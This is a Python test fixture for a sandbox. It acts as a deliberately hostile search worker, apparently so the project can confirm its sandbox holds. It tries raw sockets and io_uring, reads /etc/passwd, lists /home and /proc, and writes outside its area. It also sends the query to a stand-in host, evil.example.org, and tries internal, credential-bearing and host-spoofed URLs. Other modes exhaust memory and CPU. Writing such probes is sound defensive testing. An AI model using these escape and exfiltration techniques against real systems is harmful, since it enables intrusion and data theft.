# SPDX-License-Identifier: Apache-2.0
"""A deliberately hostile stand-in for the search worker (04-C2 probe).

It speaks the broker protocol and tries to escape the sandbox, to widen its
requests and to exhaust the host. Standard library only; it imports nothing
from SearXNG. Used by `crates/engine/src/network/managed_probe.rs`.
"""

import ctypes
import json
import os
import socket
import subprocess
import sys
import threading
import time
from urllib.parse import urlencode

MODE = sys.argv[1]


def send(message):
    sys.stdout.write(json.dumps(message) + "\n")
    sys.stdout.flush()


def receive():
    line = sys.stdin.readline()
    if not line:
        os._exit(3)
    return json.loads(line)


def attempt(action):
    try:
        action()
        return "allowed"
    except BaseException as error:  # noqa: BLE001 - the outcome is the point
        return type(error).__name__


def raw_socket_call():
    libc = ctypes.CDLL(None, use_errno=True)
    if libc.socket(2, 1, 0) < 0:
        raise OSError(ctypes.get_errno(), "socket")


def io_uring():
    # io_uring_setup: the ring could create sockets without the socket call.
    libc = ctypes.CDLL(None, use_errno=True)
    parameters = ctypes.create_string_buffer(120)
    if libc.syscall(425, 4, parameters) < 0:
        raise OSError(ctypes.get_errno(), "io_uring_setup")


def forked():
    if os.fork() == 0:
        os._exit(0)


def threaded():
    thread = threading.Thread(target=lambda: None)
    thread.start()
    thread.join()


def probes():
    return {
        "inet_socket": attempt(lambda: socket.socket(socket.AF_INET, socket.SOCK_STREAM)),
        "unix_socket": attempt(lambda: socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)),
        "raw_socket": attempt(lambda: socket.socket(socket.AF_PACKET, socket.SOCK_RAW)),
        "libc_socket": attempt(raw_socket_call),
        "io_uring": attempt(io_uring),
        "dns": attempt(lambda: socket.getaddrinfo("example.com", 443)),
        "fork": attempt(forked),
        "subprocess": attempt(lambda: subprocess.run([sys.executable, "-c", ""], check=True)),
        "passwd": attempt(lambda: open("/etc/passwd").read()),
        "home": attempt(lambda: os.listdir("/home")),
        "processes": attempt(lambda: os.listdir("/proc/1")),
        "root_write": attempt(lambda: open("/escape", "w")),
        "pack_write": attempt(lambda: open("/pack/escape", "w")),
        "thread": attempt(threaded),
        "environment": sorted(os.environ),
    }


def ask(url, number, method="GET"):
    send(
        {
            "type": "request",
            "id": number,
            "method": method,
            "url": url,
            # Headers are never forwarded.
            "headers": {"X-Leak": "secret", "Cookie": "session=1"},
        }
    )


def github(query, extra=""):
    pairs = {"sort": "stars", "order": "desc", "q": query}
    return "https://api.github.com/search/repositories?" + urlencode(pairs) + extra


def main():
    if MODE == "probe":
        # Traffic during startup, before any query exists.
        ask(github("startup"), 0)
        receive()
    send({"type": "ready"})
    job = receive()
    query = job["query"]

    if MODE == "probe":
        found = probes()
        good = github(query)
        arxiv = "https://export.arxiv.org/api/query?" + urlencode(
            {"search_query": f"all:{query}", "start": 0, "max_results": 10}
        )
        attempts = [
            (good, "POST"),
            (github("another query"), "GET"),
            (github(query, "&leak=secret"), "GET"),
            (good.replace("https", "http", 1), "GET"),
            ("https://evil.example.org/?" + urlencode({"q": query}), "GET"),
            ("https://127.0.0.1/search/repositories?q=x", "GET"),
            (good.replace("api.github.com", "api.github.com.evil.example.org"), "GET"),
            (good.replace("https://", "https://user:secret@"), "GET"),
            (good.replace("api.github.com", "api.github.com:8443"), "GET"),
            ("https://api.github.com/user?" + urlencode({"q": query}), "GET"),
            (arxiv, "GET"),
            (good, "GET"),
            (good, "GET"),
        ]
        for number, (url, method) in enumerate(attempts, start=1):
            ask(url, number, method)
        replies = [receive() for _ in attempts]
        for reply in replies:
            reply.pop("body", None)
        send(
            {
                "type": "results",
                "results": [],
                "unresponsive": [],
                "probes": found,
                "replies": replies,
            }
        )
    elif MODE == "hang":
        ask(github(query), 1)
        time.sleep(1.5)
        ask("https://wiby.me/json/?" + urlencode({"q": query, "p": 1}), 2)
        time.sleep(60)
    elif MODE == "memory":
        result = attempt(lambda: bytearray(2 << 30))
        send({"type": "results", "results": [], "probes": {"allocation": result}})
    elif MODE == "flood":
        sys.stdout.write("x" * (4 << 20))
        sys.stdout.flush()
        time.sleep(60)
    elif MODE == "chatter":
        for number in range(1000):
            ask("https://evil.example.org/", number)
        time.sleep(60)
    elif MODE == "spin":
        while True:
            pass
    elif MODE == "exit":
        os._exit(0)


main()
